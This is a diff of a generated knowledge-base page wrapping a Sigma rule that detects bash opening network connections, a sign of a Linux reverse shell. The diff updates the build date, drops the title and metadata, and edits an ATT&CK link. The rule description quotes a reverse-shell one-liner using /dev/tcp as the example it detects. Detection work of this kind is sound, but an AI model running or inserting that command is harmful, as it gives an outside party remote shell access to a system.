@@ -5,7 +5,7 @@ framework: "sigma"
 generated: "true"
 source_path: "rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"
 source_url: "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml"
-build_date: "2026-04-26 17:03:19"
+build_date: "2026-04-27 19:13:52"
 status: "test"
 level: "critical"
 logsource: "linux / network_connection"
@@ -21,19 +21,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Linux Reverse Shell Indicator
-
 Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
-
-## Metadata
-
-- Rule ID: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
-- Status: test
-- Level: critical
-- Author: Florian Roth (Nextron Systems)
-- Date: 2021-10-16
-- Modified: 2022-12-25
-- Source Path: rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
 
 ## Logsource
 
@@ -44,7 +32,7 @@ Detects a bash contecting to a remote IP address (often found when actors do som
 
 ### Techniques
 
-- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.004]]
+- [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059004-unix-shell|T1059.004: Unix Shell]]
 
 ## Detection
 
